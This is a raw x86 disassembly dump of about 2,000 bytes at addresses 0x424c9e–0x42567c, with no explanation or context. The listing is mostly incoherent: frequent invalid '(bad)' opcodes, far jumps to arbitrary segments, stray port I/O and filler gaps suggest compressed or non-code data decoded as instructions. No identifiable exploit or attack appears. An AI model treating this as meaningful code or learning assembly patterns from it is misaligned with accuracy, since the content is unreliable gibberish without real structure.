  424c9e:	sub    eax,0x9588c09
  424ca3:	sub    dh,BYTE PTR [ecx+0x77]
  424ca6:	fld    DWORD PTR [edi+0x1070001]
  424cac:	add    BYTE PTR [eax],al
  424cae:	fwait
  424caf:	dec    edi
  424cb0:	retf   0x8f2c
  424cb3:	repnz outs dx,DWORD PTR ds:[esi]
  424cb5:	push   cs
  424cb6:	pop    eax
  424cb7:	dec    esp
  424cb8:	(bad)  
  424cba:	fild   WORD PTR [ecx-0x66]
  424cbd:	out    dx,al
  424cbe:	dec    ecx
  424cbf:	dec    ecx
  424cc0:	dec    ebx
  424cc1:	inc    edx
  424cc2:	repz xchg esi,eax
  424cc4:	jo     0x424d34
  424cc6:	repnz aaa 
  424cc8:	mov    bh,0x35
  424cca:	mov    al,BYTE PTR [edx+esi*2-0x44507202]
  424cd1:	sbb    al,0xa9
  424cd3:	nop
  424cd4:	jb     0x424c7d
  424cd6:	fwait
  424cd7:	daa    
  424cd8:	cwde   
  424cd9:	add    BYTE PTR [edx+0xa65575e],ch
  424cdf:	push   eax
  424ce0:	retf   0x8066
  424ce3:	clc    
  424ce4:	popf   
  424ce5:	ins    BYTE PTR es:[edi],dx
  424ce6:	leave  
  424ce7:	mov    ecx,0xdd405df
  424cec:	inc    esp
  424ced:	loopne 0x424cc8
  424cef:	es retf 0x5037
  424cf3:	mov    edx,0xd719cf13
  424cf8:	pushf  
  424cf9:	outs   dx,DWORD PTR ds:[esi]
  424cfa:	inc    eax
  424cfb:	frstor [esi+0x37]
  424cfe:	addr16 std 
  424d00:	iret   
  424d01:	pop    es
  424d02:	nop
  424d03:	xlat   BYTE PTR ds:[ebx]
  424d04:	cwde   
  424d05:	mov    edi,0x539e9008
  424d0a:	test   al,0xa5
  424d0c:	loop   0x424ce4
  424d0e:	sbb    eax,0xe911b9be
  424d13:	or     BYTE PTR [edx-0x1c],0xf4
  424d17:	bound  esp,QWORD PTR gs:[edi-0x79]
  424d1b:	aam    0xc4
  424d1d:	mov    ebp,DWORD PTR [ecx]
  424d1f:	jmp    0xbdef:0x486d8837
  424d26:	or     eax,esi
  424d28:	test   al,0xe7
  424d2a:	cmp    cl,BYTE PTR [eax+0x40]
  424d2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d2e:	mov    ah,0x3a
  424d30:	mov    al,ds:0x8c53b90c
  424d35:	ret    
  424d36:	pop    edi
  424d37:	sbb    al,0xae
  424d39:	xchg   edi,eax
  424d3a:	imul   ebx,ebx,0xffffff9e
  424d3d:	sub    eax,DWORD PTR [eax]
  424d3f:	push   es
  424d40:	stc    
  424d41:	cmp    eax,0xeba5cd78
  424d46:	mov    bl,0x79
  424d48:	xchg   esi,eax
  424d49:	cmp    al,0xc9
  424d4b:	pop    edx
  424d4c:	leave  
  424d4d:	dec    ecx
  424d4e:	out    0xf9,al
  424d50:	sub    al,0xa0
  424d52:	ins    DWORD PTR es:[edi],dx
  424d53:	popf   
  424d54:	lock test al,0x40
  424d57:	fwait
  424d58:	dec    esi
  424d59:	dec    esp
  424d5a:	xor    BYTE PTR [edx],dh
  424d5c:	cmp    eax,0x3687b46
  424d61:	call   0x9769:0x3b15a477
  424d68:	lods   al,BYTE PTR ds:[esi]
  424d69:	lock nop
  424d6b:	mov    WORD PTR [eax],?
  424d6d:	test   eax,0xa8ae7c1c
  424d72:	jno    0x424d3a
  424d74:	pop    ecx
  424d75:	or     eax,0xa123bd45
  424d7a:	jnp    0x424dea
  424d7c:	daa    
  424d7d:	outs   dx,DWORD PTR ds:[esi]
  424d7e:	stc    
  424d7f:	test   edx,ecx
  424d81:	sub    eax,0xbeb1ee73
  424d86:	mov    eax,ds:0x636f7300
  424d8b:	dec    ecx
  424d8c:	jae    0x424d46
  424d8e:	ret    0x16c5
  424d91:	aas    
  424d92:	or     DWORD PTR ds:0x4ad22a59,ebp
  424d98:	mov    esp,0x9a7885e5
  424d9d:	repz in al,0x3e
  424da0:	pop    esp
  424da1:	(bad)  [ecx-0x7e92f44e]
  424da7:	nop
  424da8:	jg     0x424df2
  424daa:	lods   al,BYTE PTR ds:[esi]
  424dab:	lahf   
  424dac:	or     dl,BYTE PTR [ebp+0x1d]
  424daf:	sub    DWORD PTR [eax],eax
  424db1:	cld    
  424db2:	cmc    
  424db3:	repz add BYTE PTR [eax],0x0
	...
  424e13:	add    BYTE PTR [eax],al
  424e15:	add    BYTE PTR ds:0xf361d20c,bh
  424e1b:	(bad)  
  424e1c:	mov    edi,0xb8b3635c
  424e21:	xchg   DWORD PTR [ebp-0x1f3236b3],edi
  424e27:	mov    BYTE PTR [ecx],al
  424e29:	add    BYTE PTR [edi],al
  424e2b:	add    DWORD PTR [eax],eax
  424e2d:	add    al,cl
  424e2f:	popa   
  424e30:	or     ch,dl
  424e32:	xchg   BYTE PTR ds:0x10501e2b,bl
  424e38:	pop    esp
  424e39:	xchg   edi,eax
  424e3a:	lahf   
  424e3b:	test   dl,cl
  424e3d:	cwde   
  424e3e:	sub    eax,0xacd08ba6
  424e43:	inc    edi
  424e44:	ss cmp eax,0x57a7f11a
  424e4a:	cmp    al,0xc3
  424e4c:	loope  0x424e5f
  424e4e:	ja     0x424df3
  424e50:	fucomi st,st(6)
  424e52:	(bad)  
  424e53:	lods   eax,DWORD PTR ds:[esi]
  424e54:	and    DWORD PTR [esi],esi
  424e56:	inc    esi
  424e57:	push   esi
  424e58:	mov    al,0xb1
  424e5a:	sbb    eax,0x6754fdcd
  424e5f:	les    ebp,FWORD PTR [esi+0x54bb4e19]
  424e65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424e66:	sbb    al,0xac
  424e68:	pop    esp
  424e69:	in     eax,dx
  424e6a:	pop    es
  424e6b:	sub    eax,0xc78d633b
  424e70:	ss (bad) 
  424e72:	cmp    bl,BYTE PTR [edx+0x38]
  424e75:	dec    DWORD PTR [esi]
  424e77:	xchg   ebp,eax
  424e78:	mov    al,ds:0x566cb520
  424e7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e7e:	or     dl,BYTE PTR [ebx]
  424e80:	mov    ecx,ebp
  424e82:	adc    DWORD PTR [edi+0x3],0xffffff95
  424e86:	cs ins BYTE PTR es:[edi],dx
  424e88:	mov    ebx,0x140c7089
  424e8d:	xchg   edi,esi
  424e8f:	sbb    BYTE PTR [edi],al
  424e91:	(bad)
  424e94:	inc    esi
  424e95:	xor    eax,0x319ae64b
  424e9a:	or     eax,0xa6e15330
  424e9f:	(bad)  
  424ea0:	rcl    ecx,cl
  424ea2:	jp     0x424eab
  424ea4:	fsubr  DWORD PTR [ecx-0x5073bb9]
  424eaa:	sbb    DWORD PTR [edi+0x7e],ebp
  424ead:	ret    
  424eae:	outs   dx,BYTE PTR ds:[esi]
  424eaf:	push   edx
  424eb0:	jns    0x424e34
  424eb2:	aam    0xba
  424eb4:	aad    0xe9
  424eb6:	xchg   ebp,eax
  424eb7:	cmp    DWORD PTR [ecx+0x13938c1f],esi
  424ebd:	cmp    al,0xe8
  424ebf:	stc    
  424ec0:	aam    0x41
  424ec2:	aam    0x8e
  424ec4:	icebp  
  424ec5:	into   
  424ec6:	ficomp WORD PTR [ebp+0x66]
  424ec9:	ret    
  424eca:	cmc    
  424ecb:	adc    eax,0xe381fd68
  424ed0:	(bad)  
  424ed1:	jmp    0x8a7f6bb6
  424ed6:	mov    bl,BYTE PTR [ebx]
  424ed8:	xchg   edi,eax
  424ed9:	dec    edx
  424eda:	push   edx
  424edb:	in     eax,dx
  424edc:	jb     0x424ede
  424ede:	xchg   ecx,eax
  424edf:	push   ebx
  424ee0:	popf   
  424ee1:	inc    ecx
  424ee2:	mov    ebp,0xa0bdf756
  424ee7:	clc    
  424ee8:	imul   DWORD PTR [eax]
  424eea:	xlat   BYTE PTR ds:[ebx]
  424eeb:	clc    
  424eec:	xlat   BYTE PTR ds:[ebx]
  424eed:	(bad)  
  424eef:	repnz ss pop edi
  424ef2:	jg     0x424f5f
  424ef4:	sub    ecx,DWORD PTR [edi-0x21]
  424ef7:	daa    
  424ef8:	mov    DWORD PTR [ebp+0x75],edx
  424efb:	inc    edx
  424efc:	test   BYTE PTR [ecx+0x6c],0x8a
  424f00:	enter  0x677,0x69
  424f04:	call   0x27b37f06
  424f09:	push   edi
  424f0a:	xchg   BYTE PTR [ebp-0x25388087],bl
  424f10:	rcl    BYTE PTR [ebp-0x59d72cf],1
  424f16:	leave  
  424f17:	jmp    0x424ed7
  424f19:	or     cl,al
  424f1b:	dec    ah
  424f1d:	cmp    edx,esi
  424f1f:	pop    ds
  424f20:	(bad)  
  424f21:	jbe    0x424ed7
  424f23:	call   0x89f3ea38
  424f28:	daa    
  424f29:	rol    BYTE PTR [ecx+edx*1],cl
  424f2c:	push   ds
  424f2d:	jecxz  0x424f6a
  424f2f:	mov    ds:0x63bdb0f3,al
  424f34:	mov    es,WORD PTR [eax]
	...
  424f96:	dec    ebx
  424f97:	push   ss
  424f98:	int    0x41
  424f9a:	fstp   st(3)
  424f9c:	iret   
  424f9d:	push   ds
  424f9e:	xor    al,0x88
  424fa0:	ror    BYTE PTR [eax-0x3fdc74aa],1
  424fa6:	out    0x89,eax
  424fa8:	add    DWORD PTR [eax],eax
  424faa:	pop    es
  424fab:	add    DWORD PTR [eax],eax
  424fad:	add    BYTE PTR [ecx-0x14f3a440],bh
  424fb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424fb4:	out    0x71,eax
  424fb6:	jmp    0x424f48
  424fb8:	(bad)  
  424fb9:	jb     0x425037
  424fbb:	test   eax,0xc68d5f24
  424fc0:	mov    WORD PTR [ecx-0x5b],ds
  424fc3:	jecxz  0x424fc7
  424fc5:	scas   al,BYTE PTR es:[edi]
  424fc6:	adc    al,0xd6
  424fc8:	push   0xfffffff7
  424fca:	pusha  
  424fcb:	or     al,0x6a
  424fcd:	or     al,0x86
  424fcf:	rcpps  xmm5,XMMWORD PTR [edi-0x42]
  424fd3:	jno    0x424f84
  424fd5:	xor    dh,cl
  424fd7:	push   ecx
  424fd8:	out    0x4,eax
  424fda:	retf   0x5f4c
  424fdd:	mov    eax,eax
  424fdf:	loope  0x425002
  424fe1:	jle    0x425047
  424fe3:	adc    al,0x91
  424fe5:	mov    ecx,0xf468322b
  424fea:	and    ah,bh
  424fec:	dec    ebx
  424fed:	pop    eax
  424fee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424fef:	ficomp WORD PTR [edi+0x6496c5d1]
  424ff5:	xchg   ebx,eax
  424ff6:	outs   dx,BYTE PTR ds:[esi]
  424ff7:	cmp    esi,esp
  424ff9:	ffree  st(3)
  424ffb:	mov    ebp,0x7e90af66
  425000:	ja     0x42500c
  425002:	loop   0x424fbd
  425004:	sbb    DWORD PTR [edx],edi
  425006:	jp     0x424fd1
  425008:	mov    bl,0x4d
  42500a:	xor    DWORD PTR [eax],edi
  42500c:	mov    WORD PTR [ecx+0x63],cs
  42500f:	inc    esi
  425010:	je     0x42505d
  425012:	xchg   esp,eax
  425013:	stc    
  425014:	pusha  
  425015:	mov    ch,0xf
  425017:	adc    esi,DWORD PTR [edi+0x2c]
  42501a:	xchg   DWORD PTR [ecx+0x31],edi
  42501d:	jl     0x425099
  42501f:	add    BYTE PTR [ebp-0x20],ch
  425022:	xor    BYTE PTR [edi-0x80],ah
  425025:	inc    DWORD PTR [ebp+0x67]
  425028:	push   eax
  425029:	fist   DWORD PTR [eax-0x9cc92c0]
  42502f:	int3   
  425030:	std    
  425031:	mov    ch,0xb6
  425033:	mov    dl,0x7
  425035:	ja     0x424fcb
  425037:	jbe    0x425045
  425039:	je     0x425094
  42503b:	push   edi
  42503c:	hlt    
  42503d:	outs   dx,DWORD PTR ds:[esi]
  42503e:	int3   
  42503f:	(bad)  
  425040:	sbb    eax,0x5e166ab7
  425045:	push   edi
  425046:	inc    ecx
  425047:	mov    ch,0x8a
  425049:	addr16 xchg ecx,eax
  42504b:	xchg   esp,eax
  42504c:	dec    ecx
  42504d:	mov    ecx,0x5ea1bf2
  425052:	or     ecx,edi
  425054:	adc    edx,DWORD PTR [ecx+0x691a668a]
  42505a:	or     al,0x14
  42505c:	imul   esp,eax,0x72
  42505f:	mov    DWORD PTR [edi+eax*1-0x16b50a5a],ecx
  425066:	xchg   edx,eax
  425067:	xlat   BYTE PTR ds:[ebx]
  425068:	test   al,0x64
  42506a:	xlat   BYTE PTR ds:[ebx]
  42506b:	shl    esi,0x94
  42506e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42506f:	and    eax,0x9f0901b7
  425074:	jae    0x4250e5
  425076:	rcl    DWORD PTR [edx-0x3c],1
  425079:	cs cdq 
  42507b:	fwait
  42507c:	addr16 pop ebp
  42507e:	sub    dl,dh
  425080:	jnp    0x4250c3
  425082:	out    dx,al
  425083:	(bad)  
  425084:	(bad)  
  425085:	(bad)  
  425086:	ror    ecx,cl
  425088:	cmp    al,0xa5
  42508a:	aam    0xc5
  42508c:	pop    edx
  42508d:	mov    bl,0x3e
  42508f:	sbb    ecx,esi
  425091:	(bad)  
  425092:	jmp    0x933e:0x74b2e121
  425099:	pop    esp
  42509a:	xor    ebp,DWORD PTR [ebp+0x789922f]
  4250a0:	xchg   ecx,eax
  4250a1:	xor    DWORD PTR [esp+esi*4-0x7b666988],ebp
  4250a8:	mov    cl,0x39
  4250aa:	xchg   esp,eax
  4250ab:	clc    
  4250ac:	call   FWORD PTR [edi]
  4250ae:	sub    BYTE PTR [eax-0x74faa32c],0x82
	...
  425115:	add    dh,bl
  425117:	adc    DWORD PTR [edi-0x15020dd],ebx
  42511d:	std    
  42511e:	and    al,0x47
  425120:	xchg   edi,eax
  425121:	sar    dl,cl
  425123:	scas   al,BYTE PTR es:[edi]
  425124:	pop    ebx
  425125:	shr    esi,cl
  425127:	mov    al,BYTE PTR [ecx]
  425129:	add    BYTE PTR [edi],al
  42512b:	add    DWORD PTR [eax],eax
  42512d:	add    BYTE PTR [eax],bh
  42512f:	sub    eax,0xe509649
  425134:	and    eax,0xaf5553e8
  425139:	(bad)  
  42513a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42513b:	jle    0x42514d
  42513d:	nop
  42513e:	add    eax,0xc2a10e0a
  425143:	sub    BYTE PTR [esi],bh
  425145:	push   es
  425146:	jmp    0x425110
  425148:	jmp    0x36d2014
  42514d:	add    al,BYTE PTR [edi-0x58]
  425150:	and    edi,DWORD PTR [ecx]
  425152:	inc    esp
  425153:	(bad)  
  425154:	aad    0x50
  425156:	retf   
  425157:	cld    
  425158:	xor    al,0x4f
  42515a:	stos   BYTE PTR es:[edi],al
  42515b:	sbb    DWORD PTR [ecx+0x2cea1aee],0x46
  425162:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425163:	cmc    
  425164:	jbe    0x4250fa
  425166:	mov    dl,0xa3
  425168:	pop    edx
  425169:	mov    dh,0xc8
  42516b:	aad    0x3a
  42516d:	sub    eax,0x63820b3f
  425172:	aas    
  425173:	xor    al,0x4f
  425175:	sbb    DWORD PTR [esi+0x35419908],0x682ac450
  42517f:	add    esp,DWORD PTR [ebx+0x6c312e93]
  425185:	and    esp,DWORD PTR [esi+0x74]
  425188:	fisubr DWORD PTR [esi+0x23]
  42518b:	mov    ecx,0xc00afe46
  425190:	sub    cl,BYTE PTR [ebp+0x16]
  425193:	retf   0xd069
  425196:	cmp    ecx,DWORD PTR [ecx-0x5bb9163d]
  42519c:	test   eax,0x6a547d2f
  4251a1:	sbb    dl,BYTE PTR [ecx-0x5c]
  4251a4:	mov    ds:0x5265f53,eax
  4251a9:	into   
  4251aa:	mov    ?,WORD PTR [ecx+edi*8-0x6a]
  4251ae:	inc    edi
  4251af:	pop    eax
  4251b0:	mov    ah,0x64
  4251b2:	sub    ecx,DWORD PTR [eax]
  4251b4:	and    DWORD PTR [edi+0x14],0xef92cef8
  4251bb:	adc    bh,BYTE PTR [ecx]
  4251bd:	rcr    BYTE PTR [eax+eax*4-0x6750fb4],cl
  4251c4:	sbb    bh,cl
  4251c6:	stos   DWORD PTR es:[edi],eax
  4251c7:	mov    esp,0x83fe52cd
  4251cc:	dec    ecx
  4251cd:	and    al,0x63
  4251cf:	inc    edx
  4251d0:	adc    al,0x3e
  4251d2:	add    esp,DWORD PTR [esi]
  4251d4:	or     DWORD PTR [edx-0x55],0xa4eabf28
  4251db:	jge    0x425173
  4251dd:	sbb    edi,eax
  4251df:	jp     0x42517f
  4251e1:	jne    0x4251a3
  4251e3:	pop    ecx
  4251e4:	jl     0x425183
  4251e6:	scas   al,BYTE PTR es:[edi]
  4251e7:	jne    0x425183
  4251e9:	adc    ecx,ebp
  4251eb:	mov    ds:0xb819421e,al
  4251f0:	stos   BYTE PTR es:[edi],al
  4251f1:	into   
  4251f2:	lock sbb BYTE PTR [edx-0xeaad0d7],bl
  4251f9:	jbe    0x4251e8
  4251fb:	sti    
  4251fc:	addr16 test eax,0x5f338557
  425202:	aaa    
  425203:	jo     0x4251d0
  425205:	inc    edi
  425206:	inc    ecx
  425207:	es dec esp
  425209:	les    edi,FWORD PTR [esi]
  42520b:	(bad)  
  42520c:	ficom  WORD PTR [edx+0x59]
  42520f:	xchg   esp,eax
  425210:	cmp    DWORD PTR [ebp+0x72],esi
  425213:	sub    al,0x9f
  425215:	hlt    
  425216:	shl    edx,0x2c
  425219:	mov    ebx,eax
  42521b:	sti    
  42521c:	out    dx,eax
  42521d:	inc    edi
  42521e:	inc    ebp
  42521f:	xchg   BYTE PTR [esi],dl
  425221:	(bad)  
  425222:	stos   BYTE PTR es:[edi],al
  425223:	and    al,0xde
  425225:	dec    eax
  425226:	enter  0xc165,0x75
  42522a:	add    ebx,DWORD PTR [edi-0x6192749f]
  425230:	add    al,bh
  425232:	ss in  al,dx
  425234:	aam    0x0
	...
  425296:	lods   al,BYTE PTR ds:[esi]
  425297:	les    esi,FWORD PTR [ebx-0x32]
  42529a:	jnp    0x42529b
  42529c:	mov    ebp,0x2e2083e6
  4252a1:	add    eax,0x1108d530
  4252a6:	cmc    
  4252a7:	mov    eax,DWORD PTR [ecx]
  4252a9:	add    BYTE PTR [edi],al
  4252ab:	add    DWORD PTR [eax],eax
  4252ad:	add    BYTE PTR [edx-0x31],ch
  4252b0:	sub    BYTE PTR [ebp+0x15],dh
  4252b3:	adc    eax,0x72325cdc
  4252b8:	cdq    
  4252b9:	fcmovb st,st(1)
  4252bb:	and    eax,0x6ad5b70d
  4252c0:	jo     0x4252c8
  4252c2:	loopne 0x425267
  4252c4:	dec    ebx
  4252c5:	jecxz  0x425320
  4252c7:	add    ax,WORD PTR [edi-0x19]
  4252cb:	mov    bh,0xba
  4252cd:	add    al,BYTE PTR [edi]
  4252cf:	call   0xcb56:0xa44d9db2
  4252d6:	imul   ecx,esi,0x3b716d3d
  4252dc:	(bad)  
  4252dd:	jb     0x425345
  4252df:	out    0x13,eax
  4252e1:	pop    edx
  4252e2:	cmp    al,0xe6
  4252e4:	cs dec ecx
  4252e6:	sbb    BYTE PTR [eax+0x2bbc679e],al
  4252ec:	je     0x425361
  4252ee:	nop
  4252ef:	loopne 0x42532f
  4252f1:	cmp    ah,BYTE PTR [esi-0x49]
  4252f4:	bts    DWORD PTR [ebx+eax*2+0x7062b398],esp
  4252fc:	cli    
  4252fd:	jns    0x4252f1
  4252ff:	stos   BYTE PTR es:[edi],al
  425300:	xlat   BYTE PTR ds:[ebx]
  425301:	adc    ebp,esp
  425303:	cmp    DWORD PTR [ecx+edx*4],edi
  425306:	mov    gs,WORD PTR ds:0xdc3f8fc2
  42530c:	xchg   ecx,eax
  42530d:	mov    ebp,0x2199f892
  425312:	pop    eax
  425313:	out    0x2d,al
  425315:	mov    eax,0x134a1076
  42531a:	ret    
  42531b:	jle    0x42535f
  42531d:	shl    dl,cl
  42531f:	cmp    al,0x7b
  425321:	std    
  425322:	xchg   BYTE PTR [edi],ch
  425324:	dec    esp
  425325:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425326:	mov    al,ds:0x5b090f82
  42532b:	je     0x425334
  42532d:	shl    DWORD PTR [edi-0xe9543e],1
  425333:	mov    bl,0xdb
  425335:	cmp    BYTE PTR [edx+eax*4-0x63],0x87
  42533a:	mov    bl,0x5d
  42533c:	cmp    DWORD PTR [edx+edx*2-0x38],ebx
  425340:	(bad)  
  425341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425342:	cli    
  425343:	imul   ecx,esp,0xffffffc3
  425346:	ins    BYTE PTR es:[edi],dx
  425347:	stos   DWORD PTR es:[edi],eax
  425348:	cmp    al,0x65
  42534a:	jl     0x4252ee
  42534c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42534d:	sbb    BYTE PTR [edx+esi*1+0x20c4156b],dh
  425354:	test   BYTE PTR ds:0xcdb09919,ch
  42535a:	pop    ecx
  42535b:	jmp    0xbf99:0x7eb513d3
  425362:	mov    edx,0x6b0cc280
  425367:	adc    BYTE PTR [eax+0x21753aec],al
  42536d:	sub    ecx,DWORD PTR [ecx+edx*2-0x10c9f25f]
  425374:	jns    0x425363
  425376:	in     eax,dx
  425377:	clc    
  425378:	fidiv  WORD PTR [ecx-0x7556685a]
  42537e:	shl    DWORD PTR [ecx],cl
  425380:	cmp    BYTE PTR [edx+esi*4+0x40],bl
  425384:	icebp  
  425385:	arpl   WORD PTR [esi+0x52],bp
  425388:	jecxz  0x425320
  42538a:	lods   eax,DWORD PTR ds:[esi]
  42538b:	mov    dh,0x11
  42538d:	dec    esp
  42538e:	sbb    al,0x22
  425390:	or     eax,0x1fa44e0c
  425395:	adc    BYTE PTR [ebp-0x1d8cd0ed],bh
  42539b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42539c:	mov    esi,0x3c6798a5
  4253a1:	std    
  4253a2:	dec    esp
  4253a3:	clc    
  4253a4:	dec    esi
  4253a5:	outs   dx,BYTE PTR ds:[esi]
  4253a6:	repnz sub BYTE PTR [ebp+0x26c2ecd3],bh
  4253ad:	sub    bh,BYTE PTR [ecx]
  4253af:	enter  0x931c,0xba
  4253b3:	pusha  
  4253b4:	rol    BYTE PTR [eax],cl
	...
  425416:	inc    edx
  425417:	or     esp,eax
  425419:	test   eax,0xeb6fedcf
  42541e:	out    0xf4,eax
  425420:	xchg   al,bl
  425422:	dec    edx
  425423:	int3   
  425424:	xchg   ebx,eax
  425425:	inc    esi
  425426:	cld    
  425427:	mov    WORD PTR [ecx],es
  425429:	add    BYTE PTR [edi],al
  42542b:	add    DWORD PTR [eax],eax
  42542d:	add    BYTE PTR [edx+0x33],bl
  425430:	test   esp,eax
  425432:	pop    eax
  425433:	sub    DWORD PTR [ecx-0x34f691e6],ebp
  425439:	cdq    
  42543a:	bound  edx,QWORD PTR [edx+0x3]
  42543d:	xchg   DWORD PTR [edx],ebp
  42543f:	enter  0xb72a,0x44
  425443:	or     al,0x74
  425445:	out    dx,eax
  425446:	push   es
  425447:	push   ss
  425448:	xor    BYTE PTR [edi],ah
  42544a:	dec    esi
  42544b:	mov    edx,0x7140d308
  425450:	sub    eax,0x1d257639
  425455:	push   edi
  425456:	mov    al,ds:0xe75386a2
  42545b:	and    eax,0x6b4a17db
  425460:	loope  0x42545a
  425462:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425463:	inc    edi
  425464:	or     eax,0x63f35d14
  425469:	fs popf 
  42546b:	(bad)  
  42546d:	or     eax,DWORD PTR [edx+0x5c]
  425470:	repnz sub eax,0x43b79026
  425476:	jmp    0xf598b993
  42547b:	jge    0x425446
  42547d:	std    
  42547e:	lock mov al,BYTE PTR [eax]
  425481:	(bad)  
  425482:	sub    DWORD PTR [ecx-0x2f],edi
  425485:	mov    eax,ds:0x81f6f081
  42548a:	jmp    0x4254a6
  42548c:	es push ds
  42548e:	xchg   esi,eax
  42548f:	or     cl,al
  425491:	dec    ebp
  425492:	loopne 0x42542b
  425494:	pop    esi
  425495:	push   es
  425496:	fisub  WORD PTR [edx+eiz*2]
  425499:	jecxz  0x42545b
  42549b:	ds fwait
  42549d:	sar    ecx,0xf5
  4254a0:	and    BYTE PTR [edi+edx*2-0x7b32cc44],dl
  4254a7:	sbb    esp,DWORD PTR [edx+0x54]
  4254aa:	(bad)  
  4254ab:	or     DWORD PTR [edx-0x28],edx
  4254ae:	mov    ds:0xc59bf35e,eax
  4254b3:	into   
  4254b4:	int3   
  4254b5:	and    esp,DWORD PTR [ebx+0x6c238692]
  4254bb:	jmp    0x86de28a9
  4254c0:	or     al,0x53
  4254c2:	stos   BYTE PTR es:[edi],al
  4254c3:	in     eax,dx
  4254c4:	dec    ecx
  4254c5:	jl     0x425503
  4254c7:	jmp    0xd0ee10c5
  4254cc:	repnz pusha 
  4254ce:	outs   dx,DWORD PTR ds:[esi]
  4254cf:	xor    BYTE PTR [eax],bl
  4254d1:	out    dx,al
  4254d2:	mov    ebx,0x8aa0d319
  4254d7:	rol    BYTE PTR [ebx-0x80],0xb8
  4254db:	jnp    0x425511
  4254dd:	shl    BYTE PTR [ebp+0x44],1
  4254e0:	fimul  DWORD PTR [edx+0x66]
  4254e3:	adc    dl,bh
  4254e5:	mov    ah,0x25
  4254e7:	xchg   edi,eax
  4254e8:	fistp  QWORD PTR [eax-0x74]
  4254eb:	sar    DWORD PTR [edi-0x2d976d86],cl
  4254f1:	jge    0x42553e
  4254f3:	stos   BYTE PTR es:[edi],al
  4254f4:	loop   0x425539
  4254f6:	(bad)  
  4254f7:	retf   0x8226
  4254fa:	pop    eax
  4254fb:	into   
  4254fc:	mov    ds,WORD PTR [edi+0x26]
  4254ff:	in     al,dx
  425500:	loope  0x4254cb
  425502:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425503:	xchg   DWORD PTR [ebx+eax*1],esi
  425506:	or     al,0x50
  425508:	aaa    
  425509:	jmp    0x92ca7bbd
  42550e:	outs   dx,DWORD PTR ds:[esi]
  42550f:	pop    esp
  425510:	jno    0x42551a
  425512:	pop    esp
  425513:	jle    0x425531
  425515:	push   eax
  425516:	pop    esp
  425517:	push   0x5bae7ee4
  42551c:	push   0xfd9b301c
  425521:	and    bl,BYTE PTR [esi+0x5b]
  425524:	jecxz  0x4254dc
  425526:	in     al,dx
  425527:	lock push ebp
  425529:	push   esi
  42552a:	lods   al,BYTE PTR ds:[esi]
  42552b:	push   esp
  42552d:	pop    esi
  42552e:	test   eax,0x86ac1be5
  425533:	add    dh,bh
	...
  425595:	add    ah,al
  425597:	jmp    0xfef4:0xfe6e7a4e
  42559e:	dec    esp
  42559f:	push   ecx
  4255a0:	ret    0x4dc6
  4255a3:	xchg   ah,bh
  4255a5:	jge    0x4255aa
  4255a7:	mov    es,WORD PTR [ecx]
  4255a9:	add    BYTE PTR [edi],al
  4255ab:	add    DWORD PTR [eax],eax
  4255ad:	add    ch,cl
  4255af:	xchg   edx,eax
  4255b0:	test   al,0x4d
  4255b2:	push   ebp
  4255b3:	xor    ecx,eax
  4255b5:	out    dx,al
  4255b6:	repz scas eax,DWORD PTR es:[edi]
  4255b8:	xor    BYTE PTR [ebp+0x3f],0x64
  4255bc:	lods   al,BYTE PTR ds:[esi]
  4255bd:	jnp    0x42558f
  4255bf:	push   0xffffffb2
  4255c1:	pop    ecx
  4255c2:	ficomp DWORD PTR [ecx+ebx*2]
  4255c5:	inc    eax
  4255c6:	mov    ebp,0x22f3022
  4255cb:	jb     0x4255cb
  4255cd:	dec    ebp
  4255ce:	push   ds
  4255cf:	push   es
  4255d0:	xor    eax,0x8f8a425d
  4255d5:	fnstenv fs:0x29153a5
  4255dc:	(bad)  
  4255dd:	dec    esp
  4255de:	int3   
  4255df:	mov    al,ds:0x65e6a76d
  4255e4:	cmp    dl,BYTE PTR [ecx-0xfad2ff4]
  4255ea:	jmp    0xd15c:0x5d90a334
  4255f1:	je     0x4255bc
  4255f3:	push   edx
  4255f4:	sbb    bh,dh
  4255f6:	lahf   
  4255f7:	cmp    eax,0x6f720a58
  4255fc:	mov    bl,0x4f
  4255fe:	push   esi
  4255ff:	(bad)  
  425600:	xchg   esi,eax
  425601:	xor    DWORD PTR [eax+edi*2+0x38510c62],ebx
  425608:	xlat   BYTE PTR ds:[ebx]
  425609:	mov    ecx,0x5f3d7d89
  42560e:	int    0x7d
  425610:	js     0x425617
  425612:	(bad)  
  425613:	mov    ebp,0xa98a636
  425618:	and    dh,al
  42561a:	xchg   edx,eax
  42561b:	int    0xa5
  42561d:	ror    DWORD PTR [esi+eax*2],0x11
  425621:	and    BYTE PTR [edx],0xd
  425624:	mov    dl,0x2d
  425626:	sbb    ah,BYTE PTR [ecx-0x2b413d30]
  42562c:	mov    bl,0x6b
  42562e:	rcr    esp,cl
  425630:	ss ins DWORD PTR es:[edi],dx
  425632:	jo     0x425676
  425634:	shl    BYTE PTR [ecx+0x7c],0xdd
  425638:	sbb    bl,BYTE PTR [ecx+edx*2+0x2959c029]
  42563f:	sbb    ecx,DWORD PTR ds:0x35a3de87
  425645:	rcl    BYTE PTR [esi+ecx*2+0x2b6d0f1e],0x60
  42564d:	xor    edi,DWORD PTR [ebx-0x13]
  425650:	fld    QWORD PTR [ebp+0xa]
  425653:	push   es
  425654:	xor    ebp,DWORD PTR [esi]
  425656:	sahf   
  425657:	mov    ds:0xcf6b054f,eax
  42565c:	jmp    0x98ff:0xf4efa48e
  425663:	arpl   WORD PTR [edx+eax*4],sp
  425666:	fs sub eax,0x115d0c
  42566c:	mov    ah,ah
  42566e:	or     eax,0x9ff9b30
  425673:	sbb    ecx,DWORD PTR [esi]
  425675:	mov    esi,0x5880ed65
  42567a:	jno    0x42566a
  42567c:	pcmpgtw mm7,QWORD PTR [ecx]
